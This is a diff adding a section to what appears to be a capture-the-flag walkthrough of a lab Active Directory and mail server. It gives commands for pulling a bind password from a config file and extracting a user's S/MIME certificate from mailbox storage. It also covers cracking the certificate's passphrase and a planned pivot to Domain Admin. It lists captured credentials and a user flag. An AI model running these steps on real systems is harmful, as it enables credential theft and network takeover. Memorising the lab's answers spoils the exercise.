@@ -1303,6 +1303,69 @@ So `svc_ldap` controls nothing that leads to `sa-joshua.harris`: it can write on
 - The two target identities confirmed: `sa-joshua.harris` (Sys Admin, the promotion account) and `da-stephanie.lewis` (Domain Admin, the goal).
 - Proof that `svc_ldap` cannot reach `sa-joshua.harris` through AD. The credential for `sa-joshua.harris` must be recovered from the mail server (owned as root): the S/MIME-protected provisioning email in his mailbox. Mail is the AD attack surface on this box.
 
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 5.8 Recover sa-joshua.harris's credential from the mail store (IN PROGRESS)
+
+Since the AD side is unreachable from `svc_ldap`, recover `sa-joshua.harris`'s password from the S/MIME-encrypted provisioning email, using root on the mail server.
+
+#### 5.8.1 Locate the provisioning mail and S/MIME material
+
+```bash
+grep -niE 'svc_smime|SMIME_LDAP_BIND' /etc/grommunio-web/config-smime.php
+#   -> PLUGIN_SMIME_LDAP_BIND_PASSWORD = qzK3xTs02G11KSkhCewW  (svc_smime)
+find / \( -iname '*.pfx' -o -iname '*.p12' \) 2>/dev/null        # nothing on disk
+ls /var/lib/gromox/user/autopilot.htb/                           # mail stores
+```
+
+Findings:
+
+- `svc_smime` / `qzK3xTs02G11KSkhCewW` (S/MIME plugin bind account).
+- `sa-joshua.harris` and `da-stephanie.lewis` have no mailboxes; the provisioning email is in `joshua.harris`'s store.
+- In `.../joshua.harris/eml/`, the message from `stephanie.lewis` at 19:57 is `Content-Type: application/pkcs7-mime` (encrypted); her 19:24 plaintext reply says *"I'll follow up to this message with an encrypted email containing your credential details."*
+- The encrypted email has two recipients, both issued by `autopilot-DC01-CA` (AD Certificate Services).
+
+#### 5.8.2 Extract Joshua's private cert (PKCS#12) from his mailbox
+
+Mail content is zstd-compressed under `cid/`. grommunio-web stored Joshua's S/MIME cert as a base64 PKCS#12 inside a message body (friendly name `te-SecureEmail-...`).
+
+```bash
+mkdir -p /tmp/jh; i=0
+for f in $(find /var/lib/gromox/user/autopilot.htb/joshua.harris/cid -type f); do
+  zstd -dq "$f" -o /tmp/jh/c$i 2>/dev/null; i=$((i+1)); done
+tr -d '\r\n ' < /tmp/jh/c2 | grep -aoE 'MII[A-Za-z0-9+/]{200,}=*' | sort -u | head -1 | base64 -d > /tmp/joshua.p12
+openssl pkcs12 -in /tmp/joshua.p12 -noout -passin pass:x 2>&1 | head -1   # Mac verify error = confirmed p12
+```
+
+#### 5.8.3 Crack the PKCS#12 passphrase (running)
+
+```bash
+pfx2john joshua.p12 > p12.hash          # PKCS#12 PBE (SHA1/SHA2), 2000 iterations
+john --wordlist=/usr/share/wordlists/rockyou.txt p12.hash
+john --show p12.hash
+```
+
+---
+
+> **>>> RESUME POINT (next session) <<<**
+>
+> 1. Get the cracked p12 passphrase: `john --show p12.hash` (or `john --restore`).
+> 2. Extract Joshua's key + cert: `openssl pkcs12 -in joshua.p12 -nodes -passin pass:<PASS> -out joshua.pem`.
+> 3. Decrypt Stephanie's email -> `sa-joshua.harris` password:
+>    `openssl smime -decrypt -inform SMIME -in fe02.eml -recip joshua.pem -inkey joshua.pem`
+>    (encrypted EML on the box: `/var/lib/gromox/user/autopilot.htb/joshua.harris/eml/R-32/fe02e05656f2428ba84ad316f99d1932`).
+> 4. With `sa-joshua.harris` creds: `proxychains evil-winrm -i 172.16.20.15 -u sa-joshua.harris -p <pw>` (WS02, he is Sys Admin); harvest `da-stephanie.lewis` (Domain Admin) from WS02; then `evil-winrm` to DC01 (172.16.20.1) as DA and read `C:\Users\Administrator\Desktop\root.txt`.
+>
+> In hand: root on grommunio (`/usr/bin/bash -p`); user flag `ec96a1cbc119bfd8161c1c27b8ccfa9f`; creds `svc_ldap:Brother6-Let-Ship-Been-Take`, `svc_smime:qzK3xTs02G11KSkhCewW`; grommunio admin JWT (reset to admin123); tunnel = chisel reverse SOCKS `127.0.0.1:1080` + proxychains.
+
+
 
 
 <div align="center">
